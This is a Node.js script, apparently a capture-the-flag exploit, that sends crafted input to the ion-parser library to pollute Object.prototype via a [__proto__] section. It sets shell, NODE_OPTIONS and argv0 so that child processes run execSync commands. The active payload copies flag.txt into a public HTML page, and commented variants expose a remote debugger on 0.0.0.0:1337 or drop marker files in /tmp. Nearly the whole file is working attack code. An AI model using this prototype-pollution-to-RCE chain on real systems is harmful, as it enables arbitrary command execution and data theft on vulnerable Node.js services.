const ion = require('ion-parser');

// let ion_str = 'title = "userData" \n[__proto__] main = "/usr/local/lib/node_modules/npm/scripts/changelog.js" \n shell = "node" \n env = {} \n env.NODE_OPTIONS = "--inspect -brk =0.0.0.0:1337 " \n [user]\n name = "admin" \n password = "dksjhf2798y8372ghkjfgsd8jbfsig7g2gkfjsh"'
// let ion_str = 'title = "userData" \n[__proto__].exports."." = "./changelog.js" \n 1 = "/usr/local/lib/node_modules/npm/scripts/" \n main = "/usr/local/lib/node_modules/npm/scripts/changelog.js" \n shell = "node" \n env = {} \n env.NODE_OPTIONS = "--inspect -brk =0.0.0.0:1337 " \n [user]\n name = "admin" \n password = "dksjhf2798y8372ghkjfgsd8jbfsig7g2gkfjsh"'

// let ion_str = 'title = "userData" \n [__proto__] export = { "." = "./changelog.js"} \n 1 = "/usr/local/lib/node_modules/npm/scripts/" \n NODE_OPTIONS =  "--require /proc/self/cmdline" \n argv0 = "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"'

// `
// title = "userData"
// [__proto__].exports."." = "./malicious.js"
// 1 = "/tmp"

// NODE_OPTIONS = "--require /proc/self/cmdline"
// argv0: "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//

// [user]
// name = "admin"
// password = "dksjhf2798y8372ghkjfgsd8jbfsig7g2gkfjsh"
// `;

// let ion_str = '{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}'

let ion_str = 'title = "userData" \n [__proto__] shell = "/proc/self/exe" \n argv0 = "require(\\\"child_process\\\").execSync(\\\"cat flag.txt > public/pages/empty.html\\\")//" \n  NODE_OPTIONS = "--require /proc/self/cmdline" \n [user] \n name = "admin" \n password = "dksjhf2798y8372ghkjfgsd8jbfsig7g2gkfjsh"'
// let ion_str = 'title = "userData" \n [__proto__] shell = "/proc/self/exe" \n argv0 = "require(\\\"child_process\\\").execSync(\\\"cat flag.txt > public/pages/empty.html\\\")//" \n  NODE_OPTIONS = "--require /proc/self/cmdline" \n [user] \n name = "admin" \n password = "dksjhf2798y8372ghkjfgsd8jbfsig7g2gkfjsh"'


let ion_obj = ion.parse(ion_str);

console.log(ion_obj);

console.log(Object.shell);

console.log(Object.NODE_OPTIONS);
console.log(Object.argv0);